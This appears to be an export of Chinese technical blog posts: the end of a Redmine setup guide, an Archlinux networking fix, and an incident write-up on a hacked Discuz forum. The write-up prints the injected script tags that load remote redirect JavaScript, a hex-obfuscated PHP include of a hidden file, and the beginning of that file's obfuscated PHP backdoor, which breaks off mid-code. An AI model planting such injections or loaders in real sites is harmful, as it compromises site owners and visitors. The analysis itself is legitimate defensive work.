style=\"color: #99cc99;\">CREATE<\/span> DATABASE redmine <span style=\"color: #6699cc;\">CHARACTER<\/span> <span style=\"color: #99cc99;\">SET<\/span> utf8;\n<span style=\"color: #99cc99;\">CREATE<\/span> <span style=\"color: #cc99cc;\">USER<\/span> <span style=\"color: #66cccc;\">'redmine'<\/span>@<span style=\"color: #66cccc;\">'localhost'<\/span> IDENTIFIED <span style=\"color: #99cc99;\">BY<\/span> <span style=\"color: #66cccc;\">'redmine'<\/span>;\n<span style=\"color: #99cc99;\">GRANT<\/span> <span style=\"color: #99cc99;\">ALL<\/span> <span style=\"color: #99cc99;\">PRIVILEGES<\/span> <span style=\"color: #99cc99;\">ON<\/span> redmine.* <span style=\"color: #99cc99;\">TO<\/span> <span style=\"color: #66cccc;\">'redmine'<\/span>@<span style=\"color: #66cccc;\">'localhost'<\/span>;\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4fee\u6539\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">cp config\/database.yml.example config\/database.yml\ndiff config\/database.yml config\/database.yml.example\n10,11c10,11\n&lt;   username: redmine\n&lt;   password: <span style=\"color: #66cccc;\">\"redmine\"<\/span>\n---\n&gt;   username: root\n&gt;   password: <span style=\"color: #66cccc;\">\"\"<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521d\u59cb\u5316\u4f1a\u8bdd\u5b58\u50a8\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rake generate_secret_token\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efa\u6570\u636e\u5e93\u8868\u7ed3\u6784\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">RAILS_ENV<\/span>=production rake db:migrate\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u89e3\u51b3\u4e0a\u4e00\u6b65\u53ef\u80fd\u51fa\u73b0\u7684\u9519\u8bef\n\n<blockquote>\n<p>\nrake aborted!\nCan't connect to local MySQL server through socket '\/var\/lib\/mysql\/mysql.sock' (2)\n<\/p>\n\n<p>\nTasks: TOP =&gt; db:migrate =&gt; environment\n<\/p>\n<\/blockquote>\n\n<p>\n\u786e\u5b9a <code>mysql<\/code> \u542f\u52a8\u65f6\u6307\u5b9a\u7684 <code>mysql.sock<\/code> \u6587\u4ef6\u7684\u8def\u5f84\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ps aux | grep mysql.sock\n<\/pre>\n<\/div>\n\n<p>\n\u663e\u793a\u7684 <code>mysql.sock<\/code> \u8def\u5f84\u53ef\u80fd\u4e3a\u201c <code>--socket=\/tmp\/mysql.sock<\/code> \u201d\n<\/p>\n\n<p>\n\u4fee\u6539 <code>redmine<\/code> \u6570\u636e\u5e93\u914d\u7f6e\uff0c\u5728 <code>production<\/code> \u914d\u7f6e\u4e2d\u6dfb\u52a0 <code>socket<\/code> \u9879\uff1a\n<\/p>\n\n<pre class=\"example\">\nproduction:\n  ...\n  socket: \/tmp\/mysql.sock\n<\/pre>\n\n<p>\n\u91cd\u65b0\u8fdb\u884c\u4e0a\u4e00\u6b65\u64cd\u4f5c\u3002\n<\/p>\n<\/li>\n\n<li>\u521d\u59cb\u5316\u6570\u636e\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">RAILS_ENV<\/span>=production <span style=\"color: #ffcc66;\">REDMINE_LANG<\/span>=zh rake redmine:load_default_data\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efa\u76f8\u5173\u76ee\u5f55\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir -p tmp tmp\/pdf public\/plugin_assets\nsudo chown -R nobody:nobody files log tmp public\/plugin_assets\nsudo chmod -R 755 files log tmp public\/plugin_assets\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u8bd5\u8fd0\u884c <code>redmine<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ruby script\/rails server webrick -e production\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u6d4f\u89c8\u5668\u6253\u5f00\u9875\u9762\n\n<p>\n<a href=\"http:\/\/localhost:3000\">http:\/\/localhost:3000<\/a>\n<\/p>\n\n<p>\n\u4f7f\u7528 \u7528\u6237\u540d <code>admin<\/code> \uff0c\u5bc6\u7801 <code>admin<\/code> \u767b\u5f55\u540e\uff0c\u7acb\u5373\u4fee\u6539\u5bc6\u7801\u3002\n<\/p>\n\n<p>\n\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u751f\u6210\u968f\u673a\u7684\u5bc6\u7801\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">cat \/dev\/urandom | head -1 | md5sum | head -c 8\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u914d\u7f6e <code>redmine<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>\u4fee\u6539 <code>config\/settings.yml<\/code>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-6\" class=\"outline-2\">\n<h2 id=\"sec-6\">\u4f7f\u7528 <code>Nginx<\/code> \u548c <code>passenger<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-6\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">wget <span style=\"color: #66cccc;\">'http:\/\/nginx.org\/download\/nginx-1.4.6.tar.gz'<\/span>\ntar xzvf nginx-1.4.6.tar.gz\ngem install passenger\nyum install pcre-devel\npassenger-install-nginx-module\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u4ea4\u4e92\u5f0f\u5b89\u88c5\u8fc7\u7a0b\n\n<ul class=\"org-ul\">\n<li>Automatically download and install Nginx?\n\n<p>\n\u9009 2. No: I want to customize my Nginx installation. (for advanced users)\n<\/p>\n<\/li>\n\n<li>Where is your Nginx source code located?\n\n<p>\n\u586b\u89e3\u538b\u7684 <code>nginx<\/code> \u6e90\u7801\u5305\u8def\u5f84\n<\/p>\n<\/li>\n\n<li>Where do you want to install Nginx to?\n\n<p>\n\u586b <code>\/usr\/local\/nginx<\/code>\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>\u4fee\u6539 \/usr\/local\/nginx\/conf\/nginx.conf\n\n<p>\n\u5728\u6700\u540e\u7684 <code>}<\/code> \u524d\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\n<\/p>\n\n<pre class=\"example\">\ninclude vhosts\/*.conf;\n<\/pre>\n<\/li>\n\n<li>\u6dfb\u52a0\u7ad9\u70b9\u914d\u7f6e\u6587\u4ef6 <code>\/usr\/local\/nginx\/conf\/vhosts\/redmine.conf<\/code>\n\n<pre class=\"example\">\nserver {\n  listen  80;\n  server_name &lt;\u57df\u540d&gt;;\n  root &lt;redmine\u6839\u76ee\u5f55&gt;\/public;\n  passenger_enabled on;\n  client_max_body_size 10m; # Max attachemnt size\n}\n<\/pre>\n<\/li>\n\n<li>\u542f\u52a8 <code>nginx<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">\/usr\/local\/nginx\/sbin\/nginx\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u73b0\u5728\u53ef\u4ee5\u6b63\u5f0f\u8bbf\u95ee\u7ad9\u70b9\u4e86\n\n<p>\n<a href=\"http:\/\/\">http:\/\/<\/a>&lt;\u57df\u540d&gt;\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-7\" class=\"outline-2\">\n<h2 id=\"sec-7\">\u652f\u6301 <code>OpenID<\/code> \u7b2c\u4e09\u65b9\u5e10\u53f7\u767b\u5f55<\/h2>\n<div class=\"outline-text-2\" id=\"text-7\">\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5 <code>openid<\/code> \u5e93\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">gem install ruby-openid\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4f7f\u7528 <code>admin<\/code> \u5e10\u53f7\u767b\u5f55\u7cfb\u7edf\uff0c\u5728\u201c\u7ba1\u7406 - \u914d\u7f6e - \u8ba4\u8bc1\u201d\u4e2d\u52fe\u9009\u4e0a\u201c\u5141\u8bb8\u4f7f\u7528OpenID\u767b\u5f55\u548c\u6ce8\u518c\u201d\u3002 \n<\/li>\n\n<li>\u7528\u6237\u6ce8\u518c\u65f6\u201c\u5bc6\u7801\u201d\u53ef\u4ee5\u7701\u7565\uff0c \u586b\u4e0a <code>OpenID URL<\/code> \u5373\u53ef\u3002\n<\/li>\n\n<li>\u5982\u4f55\u83b7\u5f97Google\u7684OpenID URL\uff1f\n\n<ul class=\"org-ul\">\n<li>\u5148\u5728 <code>Google<\/code> \u7684\u7ad9\u70b9\u4e0a\u767b\u5f55\n<\/li>\n<li>\u6253\u5f00 <a href=\"https:\/\/profiles.google.com\">https:\/\/profiles.google.com<\/a> \u540e\u4f1a\u8df3\u8f6c\u5230\u7c7b\u4f3c\u8fd9\u6837\uff08 <code>https:\/\/plus.google.com\/000000000000000000000\/posts<\/code> \uff09\u7684\u7f51\u9875\n<\/li>\n<li>\u4f60\u7684 <code>OpenID URL<\/code> \u4e3a <a href=\"http:\/\/profiles.google.com\/000000000000000000000\">http:\/\/profiles.google.com\/000000000000000000000<\/a>\n<\/li>\n<\/ul>\n<p>\n\u4e0a\u9762\u7684 <code>000000000000000000000<\/code> \u53ef\u80fd\u4e3a\u4efb\u610f\u7684\u6570\u5b57\u4e32\n<\/p>\n<\/li>\n\n<li>\u7ba1\u7406\u5458\u786e\u8ba4\u6ce8\u518c\u540e\u5373\u53ef\u5728\u767b\u5f55\u754c\u9762\u4e0a\u8f93\u5165 <code>OpenID URL<\/code> \u76f4\u63a5\u767b\u5f55\n\n<p>\n\u4e00\u822c\u6d4f\u89c8\u5668\u7684\u8f93\u5165\u6846\u662f\u6709\u8bb0\u5fc6\u529f\u80fd\u7684\uff0c\u53cc\u51fb\u540e\u4f1a\u51fa\u73b0\u8f93\u5165\u5386\u53f2\u4e0b\u62c9\u5217\u8868\uff0c\u76f4\u63a5\u9009\u62e9\u5373\u53ef\u3002\n<\/p>\n<\/li>\n\n<li>\u5b89\u88c5\u63d2\u4ef6\u7b80\u5316 <code>OpenID<\/code> \u767b\u5f55\n\n<ul class=\"org-ul\">\n<li><a href=\"https:\/\/github.com\/jorgebg\/redmine-openid-selector\">https:\/\/github.com\/jorgebg\/redmine-openid-selector<\/a> \uff08\u4e0d\u63a8\u8350\uff09 \u4e3a\u539f\u59cb\u5206\u679d\uff0c\u5728 <code>redmine-2.5.0<\/code> \u4e0b\u4e0d\u80fd\u76f4\u63a5\u5b89\u88c5\u4f1a\u5bfc\u81f4\u7ad9\u70b9\u767b\u5f55\u754c\u9762\u51fa\u73b0404\u9519\u8bef\uff0c\u89e3\u51b3\u65b9\u6848\u5728 <a href=\"http:\/\/www.redmine.org\/boards\/3\/topics\/34327?r=38778#message-38778\">\u8fd9\u91cc<\/a> \uff0c\u7b80\u800c\u8a00\u4e4b\u5c31\u662f\u628a\u63d2\u4ef6\u76ee\u5f55\u540d\u4e2d\u7684 <code>-<\/code> \u6539\u4e3a <code>_<\/code> \u3002\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/computerminds\/redmine_openid_selector\">https:\/\/github.com\/computerminds\/redmine_openid_selector<\/a> \uff08\u4e0d\u63a8\u8350\uff09 \u8fd9\u4e2a\u5206\u679d\u5b89\u88c5\u540e\u53ef\u7528\uff0c\u4f46\u754c\u9762\u4e3a\u82f1\u6587\uff08\u5176\u5b9e\u754c\u9762\u5c31\u4e00\u53e5\u82f1\u6587\uff09\u3002\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/tangxinfa\/redmine_openid_selector\">https:\/\/github.com\/tangxinfa\/redmine_openid_selector<\/a> \uff08\u63a8\u8350\uff09 \u4e3a\u652f\u6301\u4e2d\u6587\u6211fork\u4e86\u4e0a\u4e00\u4e2a\u5206\u679d\u3002\n<\/li>\n\n<li>\u901a\u7528\u7684\u63d2\u4ef6\u5b89\u88c5\u8fc7\u7a0b\uff1a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd<\/span> plugins\ngit clone https:\/\/github.com\/tangxinfa\/redmine_openid_selector.git\nrake redmine:plugins:migrate <span style=\"color: #ffcc66;\">RAILS_ENV<\/span>=production\ntouch tmp\/restart.txt\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u901a\u7528\u7684\u63d2\u4ef6\u5378\u8f7d\u8fc7\u7a0b\uff1a\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">rake redmine:plugins:migrate <span style=\"color: #ffcc66;\">NAME<\/span>=redmine-openid-selector <span style=\"color: #ffcc66;\">VERSION<\/span>=0 <span style=\"color: #ffcc66;\">RAILS_ENV<\/span>=pr<span style=\"text-decoration: underline;\">oduction<\/span>\nrm -rf plugins\/redmine-openid-selector\ntouch tmp\/restart.txt\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n<p>\n\u73b0\u5728\u5728\u767b\u5f55\u53ca\u6ce8\u518c\u9875\u9762\u76f4\u63a5\u70b9\u51fb\u7b2c\u4e09\u65b9\u7ad9\u70b9Logo\u5373\u53ef\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-8\" class=\"outline-2\">\n<h2 id=\"sec-8\">\u6837\u5f0f\u7f8e\u5316<\/h2>\n<div class=\"outline-text-2\" id=\"text-8\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone git:\/\/github.com\/pixel-cookers\/redmine-theme.git public\/themes\/pixel-c<span style=\"text-decoration: underline;\">ookers<\/span>\ntouch tmp\/restart.txt\n<\/pre>\n<\/div>\n\n<p>\n\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 <code>admin<\/code> \u767b\u5f55\u540e\u53f0\uff0c\u5728\u201c\u7ba1\u7406 - \u914d\u7f6e - \u663e\u793a - \u4e3b\u9898\u201d\u4e2d\u542f\u7528\u4e3b\u9898 <code>Pixel-cookers<\/code> \u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Archlinux\u7f51\u7edc\u63a5\u53e3\u4e0a\u51fa\u73b0\u4e24\u4e2aIP",
  "timestamp": "2014-03-12 11:32:00",
  "tags": [
    "archlinux",
    "network"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u53d1\u73b0\u4e24\u4e2aIP\n\n<p>\n\u6211\u7684\u7535\u8111\u662f\u76f4\u63a5\u8fde\u5230\u516c\u53f8\u7684\u5899\u4e0a\u7684\u7f51\u53e3\u4e0a\u7f51\u7684\uff0c\u5728\u6d4b\u8bd5\u8def\u7531\u5668\u7684\u65f6\u5019\uff0c\u6211\u628a\u8def\u7531\u5668\u7684WAN\u53e3\u63a5\u5899\u4e0a\u7684\u7f51\u53e3\uff0c\u7136\u540e\u7535\u8111\u8fde\u5230\u8def\u7531\u5668\u7684LAN\u53e3\u4e0a\uff0c\u4e0a\u7f51\u6b63\u5e38\u3002\u67e5\u770b\u5206\u914d\u5230\u7684IP\u4e3a192.168.111.2\uff0c\u8def\u7531\u5668\u7684IP\u4e3a192.168.111.1\uff0c \u60f3\u5230\u6211\u4e00\u76f4\u7528 <code>192.168.90.73<\/code> \u8fd9\u4e2aIP\uff0c\u6709\u4e9b\u914d\u7f6e\u4e5f\u4f9d\u8d56\u8fd9\u4e2aIP\uff0c\u6240\u4ee5\u8fd8\u60f3\u5206\u5230\u8fd9\u4e2aIP\uff0c\u6240\u4ee5\u628a\u8def\u7531\u5668\u7684DHCP\u505a\u4e86\u8bbe\u7f6e\uff0c\u8def\u7531\u5668IP\u6539\u4e3a192.168.90.74\uff0c\u5206\u914d\u7684IP\u8303\u56f4\u4e3a192.168.90.71-192.168.90.73\uff0c\u518d\u6b21\u91cd\u8fde\u7535\u8111\u5206\u914d\u7684IP\u4e3a192.168.90.71\uff0c\u7136\u540e\u53d1\u73b0\u4e0a\u4e0d\u4e86\u7f51\u4e86\uff0c\u6d4f\u89c8\u5668\u4e0a\u8f93\u5165\u8def\u7531\u5668\u7684IP\uff08192.168.90.74\uff09\u7adf\u7136\u6253\u5f00\u4e86\u6211\u673a\u5668\uff08192.168.90.71\uff09\u4e0a\u5efa\u7684WEB\u670d\u52a1\uff0c\u5176\u4ed6\u4eba\u8fde\u8fd9\u4e2a\u7f51\u7edc\u5374\u53ef\u4ee5\u901a\u8fc7192.168.90.74\u8fd9\u4e2aIP\u6b63\u5e38\u6253\u5f00\u8def\u7531\u5668\u754c\u9762\uff0c\u6700\u7ec8\u901a\u8fc7\u201cip address show\u201d\u8fd9\u4e2a\u547d\u4ee4\u53d1\u73b0\u6211\u7684\u7f51\u53e3\u4e0a\u6709\u4e24\u4e2aIP\uff08192.168.90.71\u3001192.168.90.74\uff09\uff0c <code>ipconfig<\/code> \u548c\u5176\u5b83GUI\u5de5\u5177\u53ea\u80fd\u770b\u5230\u7b2c\u4e00\u4e2aIP\u3002\n<\/p>\n<\/li>\n\n<li>\u7b2c\u4e8c\u4e2aIP\u662f\u600e\u4e48\u6765\u7684\uff1f\n\n<p>\n\u6293\u5305\u5206\u6790\u4e86\u4e00\u4e0bDHCP\u7f51\u7edc\u5305\uff0c\u53ea\u7ed9\u5206\u914d\u4e86192.168.90.71\u8fd9\u4e2aIP\uff0c\u770b\u6765192.168.90.74\u8fd9\u4e2aIP\u662f\u6211\u673a\u5668\u4e0a\u914d\u7f6e\u7684\uff0c\u4e8e\u662f\u641c\u7d22\/etc\u3001\/var\u4e0b\u7684\u6587\u4ef6\uff0c\u6700\u540e\u5728\/var\/log\/journal\/*\/system.journal\u4e2d\u627e\u5230\u4e86\u65e5\u5fd7\uff1a\n<\/p>\n\n<pre class=\"example\">\nNetworkManager[375]: &lt;debug&gt; [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74\/24'\n<\/pre>\n\n<p>\n\u7136\u540e\u5728NetworkManager\u7684\u914d\u7f6e\u6587\u4ef6 <code>\/etc\/NetworkManager\/system-connections\/Profile 1<\/code> \u4e2d\u627e\u5230\u4e86\u76f8\u5173\u914d\u7f6e\uff1a\n<\/p>\n\n<pre class=\"example\">\n[ipv4]\nmethod=auto\naddress1=192.168.90.74\/24,192.168.90.2\n<\/pre>\n\n<p>\n\u5220\u9664\u6389 <code>address1<\/code> \u540e\uff0c\u518d\u91cd\u8fde\u7f51\u7edc\uff0c\u5c31\u53ea\u6709\u4e00\u4e2aIP\u4e86\u3002\n<\/p>\n\n<p>\n\u8fd9\u5e94\u8be5\u662f <code>NetworkManager<\/code> \u7684\u4e00\u4e2a <a href=\"https:\/\/bugs.archlinux.org\/task\/41395\">BUG<\/a> \uff0c\u5f53\u624b\u52a8\u8bbe\u7f6eIP\u540e\u5207\u56deDHCP\u81ea\u52a8\u83b7\u53d6IP\u65b9\u5f0f\u65f6\u4e0d\u6e05\u9664\u624b\u52a8\u8bbe\u7f6e\u7684\u65f6\u4f1a\u51fa\u73b0\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "\u8bba\u575b\u88ab\u6302\u6697\u94fe\u95ee\u9898\u5206\u6790\u4e0e\u89e3\u51b3",
  "timestamp": "2014-04-01 21:38:00",
  "tags": [
    "discuz",
    "security",
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u53d1\u73b0\u95ee\u9898<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u6709\u7f51\u53cb\u53cd\u6620\u6211\u4eec\u7684\u8bba\u575b\u88ab\u6302\u4e86\u6697\u94fe\uff0c\u5177\u4f53\u8868\u73b0\u4e3a\u4ece <code>google<\/code> \u641c\u7d22\u8bba\u575b\u540d\u79f0\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\n<\/p>\n\n\n<div class=\"figure\">\n<p><img src=\"..\/static\/site_attacked.png\" alt=\"site_attacked.png\" \/>\n<\/p>\n<\/div>\n\n<p>\n\u76f4\u63a5\u641c\u7d22\u8bba\u575b\u7f51\u5740\u51fa\u73b0\u7684\u4e00\u4e9b\u70ed\u95e8\u5e16\u5b50\u4e5f\u88ab\u6302\u4e86\u6697\u94fe\uff0c\u901a\u8fc7 <code>google<\/code> \u641c\u7d22\u7ed3\u679c\u8bbf\u95ee\u4f1a\u8df3\u5230\u6076\u610f\u7f51\u7ad9\uff0c\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u89e3\u51b3\u95ee\u9898<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u76f4\u63a5\u901a\u8fc7\u7f51\u5740\u8bbf\u95ee\u8bba\u575b\u5219\u6ca1\u6709\u4efb\u52a1\u95ee\u9898\uff0c\u5e94\u8be5\u662f\u8bba\u575b\u88ab\u6ce8\u5165\u4e86\u6076\u610f\u4ee3\u7801\uff0c\u4e00\u65f6\u6ca1\u88ab\u53d1\u73b0\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5728\u4ee3\u7801\u548c\u6570\u636e\u5e93dump\u7ed3\u679c\u4e2d\u641c\u7d22\u6076\u610f\u7ad9\u70b9\u4fe1\u606f\uff0c\u4e00\u65e0\u6240\u83b7\n<\/li>\n\n<li>\u7136\u540e\u6000\u7591\u662f\u7528\u6237\u4e0a\u4f20\u7684\u56fe\u7247\u4e2d\u6302\u4e86\u9a6c\uff0c\u7279\u522b\u662f\u8054\u60f3\u5230\u9996\u9875\u6700\u8fd1\u521a\u4e0a\u70ed\u56fe\u8f6e\u64ad\uff0c\u5b89\u88c5 <code>firefox<\/code> \u63d2\u4ef6 <code>ImageBlock<\/code> \u8ba9\u6d4f\u89c8\u5668\u4e0d\u52a0\u8f7d\u56fe\u7247\uff0c\u53ef\u662f\u95ee\u9898\u4f9d\u65e7\n<\/li>\n\n<li>\u6253\u5f00 <code>firebug<\/code> \u7684 <code>Network<\/code> \u6807\u7b7e\uff0c\u5728\u9875\u9762\u52a0\u8f7d\u8bb0\u5f55\u4e2d\u53d1\u73b0\u4e00\u4e2a\u5f02\u5e38\u7684js\u52a0\u8f7d\uff1a <code>http:\/\/api.discuz.com.de\/Seo.js<\/code> \n\n<p>\n\u5728\u4ee3\u7801\u548c\u6570\u636e\u5e93\u4e2d\u641c\u7d22\u8fd9\u4e2ajs\u627e\u4e0d\u5230\u4efb\u4f55\u4fe1\u606f\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5c06\u6076\u610f\u7ad9\u70b9\u914d\u7f6e\u4e00\u6761 <code>hosts<\/code> \n\n<pre class=\"example\">\n127.0.0.1 api.discuz.com.de\n<\/pre>\n<\/li>\n<\/ul>\n<p>\n\u6d4f\u89c8\u5668\u4e0d\u518d\u81ea\u52a8\u8df3\u8f6c\u5230\u6076\u610f\u7f51\u7ad9\u4e86\u3002 \n<\/p>\n<\/li>\n\n<li>\u4ece <code>google<\/code> \u8df3\u8f6c\u5230\u8bba\u575b\u540e\uff0c\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u5728\u6700\u5f00\u59cb\u90e8\u5206\u53d1\u73b0\u4e86\u5f15\u5165\u6076\u610fjs\u7684\u8bed\u53e5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-html\">&lt;<span style=\"color: #f99157;\">div<\/span> <span style=\"color: #ffcc66;\">style<\/span>='display:none'&gt;&lt;<span style=\"color: #f99157;\">script<\/span> <span style=\"color: #ffcc66;\">language<\/span>='javascript' <span style=\"color: #ffcc66;\">src<\/span>='http:\/\/count31.51yes.com\/click.aspx?id=310940343<span style=\"color: #ffcc66;\">&amp;logo<\/span>=1' <span style=\"color: #ffcc66;\">charset<\/span>='gb2312'&gt;&lt;\/<span style=\"color: #f99157;\">script<\/span>&gt;&lt;\/<span style=\"color: #f99157;\">div<\/span>&gt;&lt;<span style=\"color: #f99157;\">script<\/span> <span style=\"color: #ffcc66;\">type<\/span>='text\/javascript' <span style=\"color: #ffcc66;\">src<\/span>='http:\/\/api.discuz.com.de\/Seo.js'&gt;&lt;\/<span style=\"color: #f99157;\">script<\/span>&gt;\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5728php\u811a\u672c\u4e2d\u52a0\u5165 <code>echo<\/code> \u8bed\u53e5\u9010\u6b65\u7f29\u5c0f\u8303\u56f4\uff0c\u6700\u7ec8\u53d1\u73b0\u95ee\u9898\u7531\u4e0b\u9762\u4e00\u6761\u8bed\u53e5\u5f15\u8d77\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #99cc99;\">INCLUDE<\/span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">pack(<\/span><span style=\"color: #66cccc;\">'H*'<\/span>,<span style=\"color: #66cccc;\">'2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u8bed\u53e5\u5f15\u5165\u4e86 <code>\/var\/tmp\/.SYSDUMP\/.Wh0AmI.CORE<\/code> \u811a\u672c\u3002\n<\/p>\n\n<p>\n\u5220\u9664\u8be5\u8bed\u53e5\u540e\u95ee\u9898\u89e3\u51b3\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5206\u6790\u6076\u610f\u4ee3\u7801<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><code>\/var\/tmp\/.SYSDUMP\/.Wh0AmI.CORE<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php<\/span> $<span style=\"color: #ffcc66;\">O00OO0<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">urldecode(<\/span><span style=\"color: #66cccc;\">\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2<\/span><span style=\"color: #66cccc; text-decoration: underline;\">A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"<\/span><span style=\"text-decoration: underline;\">);$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00O0O<\/span><span style=\"text-decoration: underline;\">=$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">3<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">6<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">33<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">30<\/span><span style=\"text-decoration: underline;\">};$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00<\/span><span style=\"text-decoration: underline;\">=$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">33<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">10<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">24<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">10<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O00OO0<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">24<\/span><span style=\"text-decoration: underline;\">};$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">OO0O00<\/span><span style=\"text-decoration: underline;\">=$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">O0OO00<\/span><span style=\"text-decoration: underline;\">{<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">0<\/span><span style=\"text-decoration: underline;\">}.$<\/span><span style=\"color: 